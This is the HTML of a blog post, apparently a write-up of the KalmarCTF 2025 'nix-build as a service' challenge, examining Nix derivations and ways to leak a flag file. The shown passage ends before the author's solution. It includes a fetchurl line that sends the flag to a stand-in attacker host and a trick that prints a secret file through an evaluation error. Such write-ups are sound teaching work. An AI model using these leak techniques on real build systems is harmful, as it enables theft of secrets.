@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+<meta charset="utf-8" />
+<meta http-equiv="x-ua-compatible" content="ie=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="base" content="https://parnianlali.github.io" />
+<meta name="HandheldFriendly" content="True" />
+<meta name="mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="default" />
+
+<meta name="referrer" content="no-referrer-when-downgrade">
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500|Nunito&amp;display=swap" rel="stylesheet" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://parnianlali.github.io/common.css?h=5973d4556e23e9912129" />
+<link rel="stylesheet" href="https://parnianlali.github.io/blog.css?h=e3b0c44298fc1c149afb" /><meta name="robots" content="index, follow" />
+  <meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+  <meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+  <link rel="icon" href="https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;icooo.d9428ffc3f81bf19.png" type="image/png">
+  <title>KalmarCTF 2025 Write-up: nix-build as a service | Parnian Lali</title>
+  <meta property="og:title" content="KalmarCTF 2025 Write-up: nix-build as a service" />
+  <meta name="twitter:title" content="KalmarCTF 2025 Write-up: nix-build as a service" />
+  <meta name="copyright" content="Parnian Lali" />
+  <meta name="description" content="This is a write-up of the “nix-build as a service” challenge from KalmarCTF 2025,
+a sequel to last year’s “Reproducible Pwning” challenge.
+To get to the solution, we will take a peek behind the curtain into how Nix derivations
+work internally." />
+  <meta property="og:description" content="This is a write-up of the “nix-build as a service” challenge from KalmarCTF 2025,
+a sequel to last year’s “Reproducible Pwning” challenge.
+To get to the solution, we will take a peek behind the curtain into how Nix derivations
+work internally." />
+  <meta name="twitter:description" content="This is a write-up of the “nix-build as a service” challenge from KalmarCTF 2025,
+a sequel to last year’s “Reproducible Pwning” challenge.
+To get to the solution, we will take a peek behind the curtain into how Nix derivations
+work internally." />
+  <link rel="canonical" href="https://parnianlali.github.io/blog/kalmarctf-writeup-nix-build-as-a-service/" />
+  <meta property="og:url" content="https://parnianlali.github.io/blog/kalmarctf-writeup-nix-build-as-a-service/" />
+  <meta name="twitter:url" content="https://parnianlali.github.io/blog/kalmarctf-writeup-nix-build-as-a-service/" />
+  <meta name="twitter:card" content="summary" />
+  <meta property="og:site_name" content="Parnian Lali" />
+  <meta property="og:locale" content="en_US" />
+  <meta property="og:type" content="website" />
+  <meta property="og:updated_time" content="2025-03-12" />
+    
+    <link rel="icon" type="image/png" href="&#x2F;assets&#x2F;images&#x2F;icooo.png">
+    
+
+  </head>
+  <body>
+    <header>
+<nav>
+  <div>
+    <button id="drawer-open" class="icon-button" aria-label="Open Navigation Drawer">
+      <svg focusable="false" viewBox="0 0 24 24" aria-hidden="true"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path></svg>
+
+    </button>
+    <h1><a href="https://parnianlali.github.io/#top">Parnian Lali</a></h1>
+  </div>
+  <div>
+    <a class="button--big" href="https:&#x2F;&#x2F;parnianlali.github.io">
+      Home
+    </a>
+    <a class="button--big" href="https:&#x2F;&#x2F;github.com&#x2F;parnianlali&#x2F;CV">
+      CV
+    </a>
+  </div>
+</nav>
+<dialog id="navbar-drawer">
+  <button id="drawer-close" class="icon-button" aria-label="Close Navigation Drawer">
+    <svg aria-hidden="true" viewBox="0 0 24 24" focusable="false"><path d="M18.3 5.71a.9959.9959 0 0 0-1.41 0L12 10.59 7.11 5.7a.9959.9959 0 0 0-1.41 0c-.39.39-.39 1.02 0 1.41L10.59 12 5.7 16.89c-.39.39-.39 1.02 0 1.41.39.39 1.02.39 1.41 0L12 13.41l4.89 4.89c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L13.41 12l4.89-4.89c.38-.38.38-1.02 0-1.4z"></path></svg>
+
+  </button>
+  <div class="navbar-drawer-links">
+    <a class="button--big" href="https:&#x2F;&#x2F;parnianlali.github.io">
+      Home
+    </a>
+    <a class="button--big" href="https:&#x2F;&#x2F;github.com&#x2F;parnianlali&#x2F;CV">
+      CV
+    </a>
+  </div>
+</dialog>
+<div id="navbar-trigger" style="position: absolute; width: 1px; height: 1px; top: 100px; left: 0;"></div>
+    </header>
+    <main id="top">
+
+<div class="container post">
+  <a class="back" href=https://parnianlali.github.io/blog>Back to post list</a>
+  <article>
+    <header>
+      <h1>KalmarCTF 2025 Write-up: nix-build as a service</h1>
+      <span>2025-03-12 &middot; 16 minute read</span>
+      <p>
+        <a href="https://parnianlali.github.io/tags/ctf/">#ctf</a>
+        <a href="https://parnianlali.github.io/tags/ctf-writeup/">#ctf-writeup</a>
+        <a href="https://parnianlali.github.io/tags/nix/">#nix</a>
+      </p>
+    </header>
+    <div>
+      
+      
+      <div class="table-of-contents">
+        <ul>
+          
+            <li>
+              <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-nix-build-as-a-service/#the-challenge">The Challenge</a>
+                
+                <ul>
+                  
+                  <li>
+                    <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-nix-build-as-a-service/#nix-code">Nix Code</a>
+                  </li>
+                  
+                  <li>
+                    <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-nix-build-as-a-service/#web-app">Web App</a>
+                  </li>
+                  
+                  <li>
+                    <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-nix-build-as-a-service/#handout-update">Handout Update</a>
+                  </li>
+                  
+                </ul>
+                
+            </li>
+          
+            <li>
+              <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-nix-build-as-a-service/#investigating-attack-vectors">Investigating Attack Vectors</a>
+                
+                <ul>
+                  
+                  <li>
+                    <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-nix-build-as-a-service/#what-is-a-derivation">What is a Derivation?</a>
+                  </li>
+                  
+                  <li>
+                    <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-nix-build-as-a-service/#tostring-ing">toString-ing</a>
+                  </li>
+                  
+                </ul>
+                
+            </li>
+          
+            <li>
+              <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-nix-build-as-a-service/#side-channels">Side-channels</a>
+                
+            </li>
+          
+            <li>
+              <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-nix-build-as-a-service/#intended-solution">Intended Solution</a>
+                
+            </li>
+          
+            <li>
+              <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-nix-build-as-a-service/#final-remarks">Final Remarks</a>
+                
+            </li>
+          
+        </ul>
+      </div>
+      
+      <p>This is a write-up of the “nix-build as a service” challenge from KalmarCTF 2025,
+a sequel to last year’s <a href="/blog/kalmarctf-writeup-reproducible-pwning">“Reproducible Pwning”</a> challenge.
+To get to the solution, we will take a peek behind the curtain into how Nix derivations
+work internally.</p>
+<span id="continue-reading"></span><h2 id="the-challenge">The Challenge</h2>
+<p>Let’s begin by taking a look at the challenge.
+We were provided with a <a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/kalmarunionenctf/kalmarctf/tree/main/2025/misc/nix-build-aas">tarball</a>, containing a flake and a Rust web app,
+and the following description, including some (very welcome) instructions for
+running it locally:</p>
+<blockquote>
+<p>Reproducible pwning is back!
+This time we learned our lesson and instead of full SSH access you can
+only request building a derivation.
+Surely you won’t be able to leak anything this time?</p>
+<p>The comments in the code could be rather helpful.
+Everyone gets their own instance for this challenge.
+[…]
+To run the instance locally, unpack the handout and run <code>nix run .#qemu</code>.
+The spawned VM will give you root shell access, as well as bind the web UI
+at localhost:8080.</p>
+</blockquote>
+<p>The tarball contains the following files:</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>.
+</span><span>├── base.nix
+</span><span>├── chall
+</span><span>│   ├── chall.sh
+</span><span>│   ├── default.nix
+</span><span>│   ├── flag.txt
+</span><span>│   ├── no-builtins.nix
+</span><span>│   ├── README.md
+</span><span>│   └── user-input.nix
+</span><span>├── flake.lock
+</span><span>├── flake.nix
+</span><span>└── ui
+</span><span>    ├── Cargo.lock
+</span><span>    ├── Cargo.toml
+</span><span>    ├── package.nix
+</span><span>    ├── src
+</span><span>    │   ├── main.rs
+</span><span>    │   └── state.rs
+</span><span>    ├── static
+</span><span>    │   ├── Iosevka-Regular.woff2
+</span><span>    │   ├── Iosevka.css
+</span><span>    │   └── main.css
+</span><span>    └── templates
+</span><span>        └── main.html
+</span></code></pre>
+<h3 id="nix-code">Nix Code</h3>
+<p>Starting with <code>flake.nix</code> and <code>base.nix</code>, there isn’t much to see there apart from configurations
+for properly setting up the VM, but the nix configuration stands out because it disables
+<a rel="noopener nofollow noreferrer" target="_blank" href="https://nix.dev/manual/nix/2.24/language/import-from-derivation">import from derivation</a>, which could restrict what we can do later:</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#5f6364;"># ...
+</span><span>  </span><span style="color:#bb80b3;">nix</span><span>.</span><span style="color:#bb80b3;">settings </span><span style="color:#5fb3b3;">= {
+</span><mark style="background-color:#3e4044;"><span>    </span><span style="color:#bb80b3;">allow-import-from-derivation </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">false</span><span style="color:#5fb3b3;">;
+</span></mark><span>    </span><span style="color:#bb80b3;">experimental-features </span><span style="color:#5fb3b3;">= [
+</span><span>      </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">flakes</span><span style="color:#5fb3b3;">&quot;
+</span><span>      </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">nix-command</span><span style="color:#5fb3b3;">&quot;
+</span><span>      </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">no-url-literals</span><span style="color:#5fb3b3;">&quot;
+</span><span>    </span><span style="color:#5fb3b3;">];
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span>  </span><span style="color:#5f6364;"># ...
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>Continuing to the <code>chall/</code> directory, we find a <code>default.nix</code> file that builds a derivation:</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#c594c5;">let
+</span><span>  </span><span style="color:#bb80b3;">nixpkgs </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">builtins</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">fetchTarball </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#bb80b3;">url </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">https://github.com/NixOS/nixpkgs/archive/8532db2a88ba56de9188af72134d93e39fd825f3.tar.gz</span><span style="color:#5fb3b3;">&quot;;
+</span><span>    </span><span style="color:#bb80b3;">sha256 </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">sha256-tttEXgKimgbtPvxFl+Avos4P4lssIqxHhxpLbbvNekk=</span><span style="color:#5fb3b3;">&quot;;
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span>  </span><span style="color:#bb80b3;">pkgs </span><span style="color:#5fb3b3;">= </span><span style="color:#6699cc;">import </span><span style="color:#f99157;">nixpkgs </span><span style="color:#5fb3b3;">{ };
+</span><span>  </span><span style="color:#c594c5;">inherit </span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">) </span><span style="color:#bb80b3;">lib</span><span style="color:#5fb3b3;">;
+</span><span>  </span><span style="color:#bb80b3;">no-builtins </span><span style="color:#5fb3b3;">= </span><span style="color:#6699cc;">import </span><span style="color:#99c794;">./no-builtins.nix</span><span style="color:#5fb3b3;">;
+</span><mark style="background-color:#3e4044;"><span>  </span><span style="color:#bb80b3;">user-input </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">builtins</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">scopedImport </span><span style="color:#f99157;">no-builtins </span><span style="color:#99c794;">./user-input.nix</span><span style="color:#5fb3b3;">;
+</span></mark><span>  </span><span style="color:#5f6364;"># TODO: Make sure the user does not reference the flag
+</span><mark style="background-color:#3e4044;"><span>  </span><span style="color:#bb80b3;">user-drv </span><span style="color:#5fb3b3;">= </span><span style="color:#c594c5;">assert </span><span style="color:#f99157;">lib</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">isDerivation user-input</span><span>; </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">hello </span><span style="color:#5fb3b3;">// </span><span style="color:#f99157;">user-input</span><span style="color:#5fb3b3;">;
+</span></mark><span style="color:#c594c5;">in
+</span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">stdenvNoCC</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">mkDerivation </span><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#bb80b3;">pname </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">nixjail</span><span style="color:#5fb3b3;">&quot;;
+</span><span>  </span><span style="color:#bb80b3;">version </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">0.0.1</span><span style="color:#5fb3b3;">&quot;;
+</span><span>
+</span><span>  </span><span style="color:#bb80b3;">dontUnpack </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">true</span><span style="color:#5fb3b3;">;
+</span><span>
+</span><span>  </span><span style="color:#5f6364;"># FIXME: The user should not be able to execute arbitrary code
+</span><span>  </span><span style="color:#5f6364;"># Ref: https://github.com/NixOS/nixpkgs/blob/master/pkgs/stdenv/generic/make-derivation.nix
+</span><mark style="background-color:#3e4044;"><span>  </span><span style="color:#bb80b3;">nativeBuildInputs </span><span style="color:#5fb3b3;">= [</span><span style="color:#f99157;">user-drv</span><span style="color:#5fb3b3;">];
+</span></mark><span>
+</span><span>  </span><span style="color:#bb80b3;">installPhase </span><span style="color:#5fb3b3;">= &#39;&#39;
+</span><span style="color:#99c794;">    mkdir -p &quot;$out&quot;
+</span><span style="color:#99c794;">    echo kalmarctf{not-this-flag} &gt; &quot;$out/flag&quot;
+</span><span style="color:#99c794;">  </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>As mentioned in the challenge description, the comments indeed give various pointers of
+what we should do to get the flag.</p>
+<p>One thing that I noticed immediately was the use of <code>builtins.scopedImport</code>.
+Although I had never seen it before, the name seems pretty self explanatory, and after
+a quick search it seems like <a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/NixOS/nix/issues/1450">it is undocumented</a>.
+In a nutshell, it makes the attributes passed to it available in the scope of the
+imported file, shadowing any existing builtins.
+The challenge used this to prevent the use of any builtins in <code>user-input.nix</code>,
+as we can see in the aptly named <code>no-builtins.nix</code>:</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5f6364;"># Forbid using any of the nix builtins
+</span><span style="color:#5f6364;"># Ref: https://nix.dev/manual/nix/2.18/language/builtins.html
+</span><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">__add</span><span style="color:#5fb3b3;">&quot; = </span><span style="color:#6699cc;">throw </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">__add is not available</span><span style="color:#5fb3b3;">&quot;;
+</span><span>  </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">__currentSystem</span><span style="color:#5fb3b3;">&quot; = </span><span style="color:#6699cc;">throw </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">__currentSystem is not available</span><span style="color:#5fb3b3;">&quot;;
+</span><span>  </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">__getAttr</span><span style="color:#5fb3b3;">&quot; = </span><span style="color:#6699cc;">throw </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">__getAttr is not available</span><span style="color:#5fb3b3;">&quot;;
+</span><span>  </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">__isPath</span><span style="color:#5fb3b3;">&quot; = </span><span style="color:#6699cc;">throw </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">__isPath is not available</span><span style="color:#5fb3b3;">&quot;;
+</span><span>  </span><span style="color:#5f6364;"># (hidden for brevity)
+</span><span>  </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">__isList</span><span style="color:#5fb3b3;">&quot; = </span><span style="color:#6699cc;">throw </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">__isList is not available</span><span style="color:#5fb3b3;">&quot;;
+</span><span>  </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">__readDir</span><span style="color:#5fb3b3;">&quot; = </span><span style="color:#6699cc;">throw </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">__readDir is not available</span><span style="color:#5fb3b3;">&quot;;
+</span><span>  </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">__toXML</span><span style="color:#5fb3b3;">&quot; = </span><span style="color:#6699cc;">throw </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">__toXML is not available</span><span style="color:#5fb3b3;">&quot;;
+</span><span>  </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">fetchGit</span><span style="color:#5fb3b3;">&quot; = </span><span style="color:#6699cc;">throw </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">fetchGit is not available</span><span style="color:#5fb3b3;">&quot;;
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>I quickly checked if there were any builtins the challenge author had missed
+and found two (<code>__convertHash</code> and <code>__warn</code>), but they were not very useful.</p>
+<p>Fun fact: you might be wondering why some builtins are prefixed by underscores.
+Apparently, most (all?) builtins available under <code>builtins</code> that are not in
+the global scope directly, are <a rel="noopener nofollow noreferrer" target="_blank" href="https://discourse.nixos.org/t/readfile-vs-builtins-readfile/12355/3">also available in the global scope but prefixed with <code>__</code></a>.
+Additionally, they can also be used for <a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/NixOS/nix/issues/7290#issuecomment-1546846723">overloading some operators</a>.
+For example, when doing a multiplication (<code>a * b</code>), Nix actually runs <code>__mul a b</code>
+(interestingly, this does not apply to sums with <code>+</code>).</p>
+<p>Finally, the <code>chall/</code> directory also includes a <code>chall.sh</code> that is used to test
+the solution (i.e., building the derivation) without having to go through the web app,
+a <code>user-input.nix</code> that is effectively empty, containing only an empty attribute set,
+and perhaps most importantly, a <code>flag.txt</code> that contains the flag we want to get.</p>
+<p>It is pretty clear from these files that the goal of the challenge is to provide a
+<code>user-input.nix</code> that leaks the contents of <code>flag.txt</code> whenever the derivation in
+<code>default.nix</code> is built.</p>
+<h3 id="web-app">Web App</h3>
+<p>The Rust web app (under <code>ui/</code>) is not very interesting since it’s only used to interact
+with the challenge, but introduces a peculiar limitation: only the last line of the
+output of running <code>nix-build</code> is sent back to the user.</p>
+<pre data-lang="rs" style="background-color:#2b2c2f;color:#cccece;" class="language-rs "><code class="language-rs" data-lang="rs"><span style="color:#c594c5;">let</span><span> output </span><span style="color:#5fb3b3;">= </span><span>Command</span><span style="color:#5fb3b3;">::</span><span>new</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">nix-build</span><span style="color:#5fb3b3;">&quot;)
+</span><span>    </span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">arg</span><span style="color:#5fb3b3;">(</span><span>workdir</span><span style="color:#5fb3b3;">)
+</span><span>    </span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">stdin</span><span style="color:#5fb3b3;">(</span><span>Stdio</span><span style="color:#5fb3b3;">::</span><span>null</span><span style="color:#5fb3b3;">())
+</span><span>    </span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">stdout</span><span style="color:#5fb3b3;">(</span><span>Stdio</span><span style="color:#5fb3b3;">::</span><span>piped</span><span style="color:#5fb3b3;">())
+</span><span>    </span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">stderr</span><span style="color:#5fb3b3;">(</span><span>Stdio</span><span style="color:#5fb3b3;">::</span><span>piped</span><span style="color:#5fb3b3;">())
+</span><span>    </span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">spawn</span><span style="color:#5fb3b3;">()?
+</span><span>    </span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">wait_with_output</span><span style="color:#5fb3b3;">()
+</span><span>    </span><span style="color:#5fb3b3;">.</span><span>await</span><span style="color:#5fb3b3;">?;
+</span><span>
+</span><span style="color:#c594c5;">let</span><span> log </span><span style="color:#5fb3b3;">= </span><span style="color:#c594c5;">if</span><span> output</span><span style="color:#5fb3b3;">.</span><span>stdout</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">is_empty</span><span style="color:#5fb3b3;">() {
+</span><span>    output</span><span style="color:#5fb3b3;">.</span><span>stderr
+</span><span style="color:#5fb3b3;">} </span><span style="color:#c594c5;">else </span><span style="color:#5fb3b3;">{
+</span><span>    output</span><span style="color:#5fb3b3;">.</span><span>stdout
+</span><span style="color:#5fb3b3;">};
+</span><span style="color:#c594c5;">let</span><span> log </span><span style="color:#5fb3b3;">= </span><span style="color:#fac863;">String</span><span style="color:#5fb3b3;">::</span><span>from_utf8_lossy</span><span style="color:#5fb3b3;">(&amp;</span><span>log</span><span style="color:#5fb3b3;">);
+</span><span style="color:#c594c5;">let</span><span> last_line </span><span style="color:#5fb3b3;">=</span><span> log
+</span><span>    </span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">lines</span><span style="color:#5fb3b3;">()
+</span><mark style="background-color:#3e4044;"><span>    </span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">last</span><span style="color:#5fb3b3;">()
+</span></mark><span>    </span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">map</span><span style="color:#5fb3b3;">(|</span><span style="color:#f99157;">s</span><span style="color:#5fb3b3;">| </span><span>s</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">to_string</span><span style="color:#5fb3b3;">())
+</span><span>    </span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">unwrap_or_default</span><span style="color:#5fb3b3;">();
+</span><span>
+</span><span style="color:#c594c5;">let </span><span style="color:#5fb3b3;">_ =</span><span> d</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">close</span><span style="color:#5fb3b3;">();
+</span><span>
+</span><span style="color:#fac863;">Ok</span><span style="color:#5fb3b3;">(</span><span>Main </span><span style="color:#5fb3b3;">{
+</span><span>    status</span><span style="color:#5fb3b3;">: </span><span style="color:#fac863;">Some</span><span style="color:#5fb3b3;">(</span><span>output</span><span style="color:#5fb3b3;">.</span><span>status</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">success</span><span style="color:#5fb3b3;">().</span><span style="color:#6699cc;">into</span><span style="color:#5fb3b3;">()),
+</span><span>    user_input</span><span style="color:#5fb3b3;">,
+</span><span>    last_line</span><span style="color:#5fb3b3;">,
+</span><span>    files</span><span style="color:#5fb3b3;">,
+</span><span style="color:#5fb3b3;">})
+</span></code></pre>
+<h3 id="handout-update">Handout Update</h3>
+<p>Halfway through the CTF, the handout was updated, nerfing the challenge a bit
+by adding the following to <code>default.nix</code>:</p>
+<pre data-lang="diff" style="background-color:#2b2c2f;color:#cccece;" class="language-diff "><code class="language-diff" data-lang="diff"><span style="color:#5fb3b3;">&gt;</span><span style="color:#99c794;">   buildPhase = &#39;&#39;
+</span><span style="color:#5fb3b3;">&gt;</span><span style="color:#99c794;">     runHook preBuild
+</span><span style="color:#5fb3b3;">&gt;</span><span style="color:#99c794;">     # TODO: Enable building
+</span><span style="color:#5fb3b3;">&gt;</span><span style="color:#99c794;">     # &quot;${user-drv}/bin/build&quot;
+</span><span style="color:#5fb3b3;">&gt;</span><span style="color:#99c794;">     runHook postBuild
+</span><span style="color:#5fb3b3;">&gt;</span><span style="color:#99c794;">   &#39;&#39;;
+</span></code></pre>
+<p>My solution requires this change, but the <a href="https://parnianlali.github.io/blog/kalmarctf-writeup-nix-build-as-a-service/#intended-solution">intended solution</a> that
+we will take a look at in a bit does not.</p>
+<h2 id="investigating-attack-vectors">Investigating Attack Vectors</h2>
+<p>Now knowing the challenge a bit better, we start to think how we can leak the flag.
+Briefly ignoring the limitation of not being allowed to use any builtins, there are two major ways.</p>
+<p>Firstly, derivations in Nix are usually built in a sandbox without network access.
+A notable exception are <a rel="noopener nofollow noreferrer" target="_blank" href="https://nix.dev/manual/nix/2.24/language/advanced-attributes.html#adv-attr-outputHash">Fixed-Output Derivations (FOD)</a>, of which the cryptographic
+hash of the output is known in advance, and therefore can access the network to,
+for example, download files.
+They are commonly used in fetchers like <code>fetchurl</code> and <code>fetchFromGitHub</code>.
+Using a FOD, we could perform a request to a URL we control, therefore sending the flag
+our way, since the hash is naturally only checked <em>after</em> the request is made.
+A practical example of this would be:</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#f99157;">fetchurl </span><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#bb80b3;">url </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">https://attacker.com/?</span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">flag</span><span style="color:#5fb3b3;">}&quot;;
+</span><span>  </span><span style="color:#bb80b3;">hash </span><span style="color:#5fb3b3;">= &quot;&quot;;
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>Another approach could be to instead take advantage of the web app by leaking
+the flag directly or indirectly through the build log.
+Unfortunately, the log only contains the last line, which makes this a lot more
+difficult.
+To leak the flag directly, we would need to throw an evaluation error in the line
+above the flag, since Nix gives some context around the error:</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>error: assertion &#39;((lib).isDerivation user-input)&#39; failed
+</span><span>at /.../nix-build-aas/chall/default.nix:11:14:
+</span><span>    10|   # TODO: Make sure the user does not reference the flag
+</span><span>    11|   user-drv = assert lib.isDerivation user-input; pkgs.hello // user-input;
+</span><span>      |              ^
+</span><span>    12| in
+</span></code></pre>
+<p>This could, in theory, be achieved by writing a Nix file and then importing it, like so:</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#c594c5;">let
+</span><span>  </span><span style="color:#bb80b3;">nixpkgs </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">builtins</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">fetchTarball </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#bb80b3;">url </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">https://github.com/NixOS/nixpkgs/archive/8532db2a88ba56de9188af72134d93e39fd825f3.tar.gz</span><span style="color:#5fb3b3;">&quot;;
+</span><span>    </span><span style="color:#bb80b3;">sha256 </span><span style="color:#5fb3b3;">= &quot;</span><span style="color:#99c794;">sha256-tttEXgKimgbtPvxFl+Avos4P4lssIqxHhxpLbbvNekk=</span><span style="color:#5fb3b3;">&quot;;
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span>  </span><span style="color:#bb80b3;">pkgs </span><span style="color:#5fb3b3;">= </span><span style="color:#6699cc;">import </span><span style="color:#f99157;">nixpkgs </span><span style="color:#5fb3b3;">{};
+</span><span>
+</span><span>  </span><span style="color:#bb80b3;">nix-file </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">writeText </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">test.nix</span><span style="color:#5fb3b3;">&quot; &#39;&#39;
+</span><span style="color:#99c794;">    {
+</span><span style="color:#99c794;">      a = assert false;
+</span><span style="color:#99c794;">      # </span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">builtins</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">readFile </span><span style="color:#99c794;">./flag.txt</span><span style="color:#5fb3b3;">}
+</span><span style="color:#99c794;">      &quot;a&quot;;
+</span><span style="color:#99c794;">    }
+</span><span style="color:#99c794;">  </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span style="color:#c594c5;">in </span><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#bb80b3;">foo </span><span style="color:#5fb3b3;">= (</span><span style="color:#6699cc;">import </span><span style="color:#f99157;">nix-file</span><span style="color:#5fb3b3;">).</span><span style="color:#f99157;">a</span><span style="color:#5fb3b3;">;
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>Which outputs the flag in the last line when evaluated:</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>error: assertion &#39;false&#39; failed
+</span><span>at /nix/store/yl3309dvhllvff04kr6r00fbxv49xw7s-test.nix:2:7:
+</span><span>     1| {
+</span><span>     2|   a = assert false;
+</span><span>      |       ^
+</span><mark style="background-color:#3e4044;"><span>     3|   # kalmar{this-is-the-right-one}
+</span></mark></code></pre>
+<p>However, in practice, this is not possible in the challenge because
+<code>allow-import-from-derivation</code> is set to false in <code>nix.conf</code>, as previously mentioned.</p>
+<p>Fortunately, there is still the possibility of changing the build output depending on
+the flag, even if the flag is not directly visible.
+This is what I ended up doing for my solution, as you will see briefly.</p>
+<p>But first, let’s take a step back and look at other limitations we still have to overcome.</p>
